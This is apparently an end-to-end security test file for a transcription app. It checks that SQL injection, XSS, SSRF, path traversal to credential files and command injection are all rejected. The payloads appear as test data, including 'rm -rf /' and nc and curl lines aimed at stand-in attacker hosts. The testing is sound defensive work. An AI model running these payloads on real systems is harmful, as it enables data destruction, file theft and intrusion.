/**
 * Security validation tests
 */
import { test, expect, invokeCommand } from './setup';

test.describe('Input Validation', () => {
  test('should sanitize SQL injection attempts', async ({ page }) => {
    const maliciousInput = "'; DROP TABLE transcriptions; --";

    // Try to inject SQL through transcription text
    const result = await invokeCommand(page, 'add_transcription', {
      text: maliciousInput,
      success: true,
    });

    // Should be safely stored
    expect(result).toBeDefined();

    // Verify database integrity
    const stats = await invokeCommand(page, 'get_database_stats');
    expect(stats).toBeDefined();

    // Verify transcription was stored safely
    const transcriptions = await invokeCommand(page, 'get_transcriptions', {
      limit: 10,
    });

    expect(transcriptions.some((t: any) => t.text === maliciousInput)).toBe(true);
  });

  test('should sanitize XSS attempts', async ({ page }) => {
    const xssPayload = '<script>alert("XSS")</script>';

    await page.goto('/');

    // Input XSS payload in settings
    await page.click('[data-testid="settings-button"]');
    await page.fill('[data-testid="webhook-url-input"]', xssPayload);
    await page.click('[data-testid="save-settings-button"]');

    // Verify it's escaped when displayed
    const displayedValue = await page.inputValue('[data-testid="webhook-url-input"]');
    expect(displayedValue).toBe(xssPayload);

    // Verify no script execution
    const alerts: string[] = [];
    page.on('dialog', (dialog) => {
      alerts.push(dialog.message());
      dialog.dismiss();
    });

    await page.reload();
    expect(alerts.length).toBe(0);
  });

  test('should validate port numbers', async ({ page }) => {
    await page.click('[data-testid="settings-button"]');

    // Try invalid ports
    for (const invalidPort of [-1, 0, 65536, 99999, 'abc']) {
      await page.fill('[data-testid="port-input"]', String(invalidPort));
      await page.click('[data-testid="save-settings-button"]');

      // Should show validation error
      await expect(page.locator('[data-testid="port-error"]')).toBeVisible();
    }

    // Valid port should work
    await page.fill('[data-testid="port-input"]', '8888');
    await page.click('[data-testid="save-settings-button"]');
    await expect(page.locator('[data-testid="port-error"]')).not.toBeVisible();
  });

  test('should validate URL formats', async ({ page }) => {
    await page.click('[data-testid="settings-button"]');
    await page.click('[data-testid="integration-tab"]');

    const invalidUrls = [
      'not-a-url',
      'javascript:alert(1)',
      'file:///etc/passwd',
      'data:text/html,<script>alert(1)</script>',
    ];

    for (const url of invalidUrls) {
      await page.fill('[data-testid="webhook-url-input"]', url);
      await page.click('[data-testid="save-settings-button"]');

      await expect(page.locator('[data-testid="url-error"]')).toBeVisible();
    }

    // Valid URLs
    const validUrls = [
      'http://localhost:3000',
      'https://example.com/webhook',
      'https://api.n8n.io/webhook/test',
    ];

    for (const url of validUrls) {
      await page.fill('[data-testid="webhook-url-input"]', url);
      await page.click('[data-testid="save-settings-button"]');

      await expect(page.locator('[data-testid="url-error"]')).not.toBeVisible();
    }
  });

  test('should limit string lengths', async ({ page }) => {
    // Try to create profile with extremely long name
    const longName = 'A'.repeat(10000);

    await page.click('[data-testid="profile-menu"]');
    await page.click('[data-testid="add-profile-button"]');
    await page.fill('[data-testid="profile-name"]', longName);
    await page.click('[data-testid="save-profile-button"]');

    // Should show length validation error
    await expect(page.locator('[data-testid="name-length-error"]')).toBeVisible();
  });
});

test.describe('Permission Boundaries', () => {
  test('should enforce profile permissions', async ({ page }) => {
    // Create restricted user profile
    const result = await invokeCommand(page, 'create_profile', {
      name: 'Restricted User',
      permissions: 'user',
      allowedCommands: ['read'],
    });

    // Switch to restricted profile
    await invokeCommand(page, 'switch_profile', { profileId: result.id });

    // Try to access admin-only features
    await page.click('[data-testid="settings-button"]');

    // Admin sections should not be visible
    await expect(page.locator('[data-testid="advanced-settings-tab"]')).not.toBeVisible();
    await expect(page.locator('[data-testid="dangerous-actions"]')).not.toBeVisible();

    // Try to invoke admin command
    const commandResult = await invokeCommand(page, 'delete_all_data').catch(
      (e: Error) => e.message
    );

    expect(commandResult).toContain('permission');
  });

  test('should validate command execution permissions', async ({ page }) => {
    const result = await invokeCommand(page, 'create_profile', {
      name: 'Read Only',
      permissions: 'user',
      allowedCommands: ['read', 'view'],
    });

    await invokeCommand(page, 'switch_profile', { profileId: result.id });

    // Allowed commands should work
    const readResult = await invokeCommand(page, 'get_transcriptions');
    expect(readResult).toBeDefined();

    // Disallowed commands should fail
    try {
      await invokeCommand(page, 'delete_transcription', { id: 1 });
      fail('Should have thrown permission error');
    } catch (e: any) {
      expect(e.message).toContain('not allowed');
    }
  });

  test('should prevent privilege escalation', async ({ page }) => {
    // Create user profile
    const userProfile = await invokeCommand(page, 'create_profile', {
      name: 'Regular User',
      permissions: 'user',
    });

    await invokeCommand(page, 'switch_profile', { profileId: userProfile.id });

    // Try to update own permissions to admin
    try {
      await invokeCommand(page, 'update_profile', {
        profileId: userProfile.id,
        permissions: 'admin',
      });
      fail('Should have prevented privilege escalation');
    } catch (e: any) {
      expect(e.message).toContain('permission');
    }
  });
});

test.describe('Secret Management', () => {
  test('should not expose API keys in UI', async ({ page }) => {
    await page.click('[data-testid="settings-button"]');
    await page.click('[data-testid="integration-tab"]');

    // Set API key
    const apiKey = 'sk_test_secret_key_12345';
    await page.fill('[data-testid="elevenlabs-api-key"]', apiKey);
    await page.click('[data-testid="save-settings-button"]');

    // Reload page
    await page.reload();

    // API key should be masked
    const inputValue = await page.inputValue('[data-testid="elevenlabs-api-key"]');
    expect(inputValue).not.toBe(apiKey);
    expect(inputValue).toMatch(/\*+/); // Should be masked
  });

  test('should store secrets in keychain', async ({ page }) => {
    const apiKey = 'sk_test_secret_key';

    await invokeCommand(page, 'store_secret', {
      key: 'elevenlabs_api_key',
      value: apiKey,
    });

    // Verify it's in keychain, not config file
    const settings = await invokeCommand(page, 'get_settings');
    expect(settings.elevenlabs_api_key).not.toBe(apiKey);

    // Should be retrievable from keychain
    const retrieved = await invokeCommand(page, 'get_secret', {
      key: 'elevenlabs_api_key',
    });
    expect(retrieved).toBe(apiKey);
  });

  test('should not log sensitive data', async ({ page }) => {
    const apiKey = 'sk_test_secret';

    await invokeCommand(page, 'update_settings', {
      elevenlabs_api_key: apiKey,
    });

    // Check logs
    const logs = await invokeCommand(page, 'get_logs', { limit: 100 });

    // API key should not appear in logs
    const hasApiKey = logs.some((log: any) => log.message.includes(apiKey));
    expect(hasApiKey).toBe(false);
  });
});

test.describe('Network Security', () => {
  test('should validate HTTPS for external services', async ({ page }) => {
    await page.click('[data-testid="settings-button"]');
    await page.click('[data-testid="integration-tab"]');

    // Try to set HTTP (insecure) webhook in production
    await page.fill('[data-testid="webhook-url-input"]', 'http://api.n8n.io/webhook');
    await page.click('[data-testid="save-settings-button"]');

    // Should warn about insecure connection
    await expect(page.locator('[data-testid="security-warning"]')).toBeVisible();
    await expect(page.locator('[data-testid="security-warning"]')).toContainText(
      /https/i
    );
  });

  test('should prevent SSRF attacks', async ({ page }) => {
    const internalUrls = [
      'http://localhost:22',
      'http://127.0.0.1:3306',
      'http://192.168.1.1',
      'http://169.254.169.254/latest/meta-data', // AWS metadata
    ];

    for (const url of internalUrls) {
      try {
        await invokeCommand(page, 'test_webhook', { url });
        fail(`Should have blocked SSRF attempt: ${url}`);
      } catch (e: any) {
        expect(e.message).toMatch(/blocked|not allowed|invalid/i);
      }
    }
  });

  test('should enforce rate limiting', async ({ page }) => {
    // Make rapid requests
    const requests = [];
    for (let i = 0; i < 100; i++) {
      requests.push(
        invokeCommand(page, 'get_state').catch((e: Error) => e.message)
      );
    }

    const results = await Promise.all(requests);

    // Some requests should be rate limited
    const rateLimited = results.filter((r) =>
      String(r).includes('rate limit')
    );

    expect(rateLimited.length).toBeGreaterThan(0);
  });
});

test.describe('File System Security', () => {
  test('should prevent path traversal', async ({ page }) => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\config\\SAM',
    ];

    for (const path of maliciousPaths) {
      try {
        await invokeCommand(page, 'read_file', { path });
        fail(`Should have blocked path traversal: ${path}`);
      } catch (e: any) {
        expect(e.message).toMatch(/not allowed|invalid|blocked/i);
      }
    }
  });

  test('should restrict file access to app directory', async ({ page }) => {
    // Try to access file outside app directory
    try {
      await invokeCommand(page, 'read_file', { path: '/tmp/evil.sh' });
      fail('Should have blocked access outside app directory');
    } catch (e: any) {
      expect(e.message).toMatch(/not allowed|permission/i);
    }
  });
});

test.describe('IPC Security', () => {
  test('should validate IPC command arguments', async ({ page }) => {
    // Try to invoke command with invalid arguments
    try {
      await invokeCommand(page, 'start_server', {
        // @ts-ignore - intentionally invalid
        maliciousArg: '<script>alert(1)</script>',
      });
    } catch (e: any) {
      // Should either ignore or reject
      expect(e.message).toBeDefined();
    }

    // Server should not have executed malicious code
    const status = await invokeCommand(page, 'get_server_status');
    expect(status).toBeDefined();
  });

  test('should prevent command injection', async ({ page }) => {
    const maliciousCommands = [
      '; rm -rf /',
      '&& cat /etc/passwd',
      '| nc attacker.com 1234',
      '`curl evil.com`',
    ];

    for (const cmd of maliciousCommands) {
      try {
        await invokeCommand(page, 'execute_command', { command: cmd });
        fail(`Should have blocked command injection: ${cmd}`);
      } catch (e: any) {
        expect(e.message).toMatch(/not allowed|invalid|blocked/i);
      }
    }
  });
});

test.describe('Authentication & Session', () => {
  test('should require authentication for sensitive operations', async ({ page }) => {
    // Clear session
    await page.evaluate(() => localStorage.clear());

    // Try to access sensitive data without authentication
    try {
      await invokeCommand(page, 'get_api_keys');
      fail('Should require authentication');
    } catch (e: any) {
      expect(e.message).toMatch(/auth|permission|not allowed/i);
    }
  });

  test('should expire inactive sessions', async ({ page }) => {
    // Set session timeout to 1 second for testing
    await invokeCommand(page, 'set_session_timeout', { seconds: 1 });

    // Wait for session to expire
    await page.waitForTimeout(2000);

    // Try to access protected resource
    try {
      await invokeCommand(page, 'get_sensitive_data');
      fail('Session should have expired');
    } catch (e: any) {
      expect(e.message).toMatch(/session|expired|auth/i);
    }
  });
});

test.describe('Data Validation', () => {
  test('should reject malformed JSON', async ({ page }) => {
    const malformedJson = '{ invalid json }';

    try {
      await invokeCommand(page, 'import_settings', { json: malformedJson });
      fail('Should reject malformed JSON');
    } catch (e: any) {
      expect(e.message).toMatch(/json|parse|invalid/i);
    }
  });

  test('should validate data types', async ({ page }) => {
    // Try to set string as port number
    try {
      await invokeCommand(page, 'update_settings', {
        port: 'not a number',
      });
      fail('Should reject invalid data type');
    } catch (e: any) {
      expect(e.message).toMatch(/type|invalid|number/i);
    }
  });

  test('should enforce required fields', async ({ page }) => {
    // Try to create profile without required name
    try {
      await invokeCommand(page, 'create_profile', {
        permissions: 'user',
      });
      fail('Should require name field');
    } catch (e: any) {
      expect(e.message).toMatch(/required|name/i);
    }
  });
});
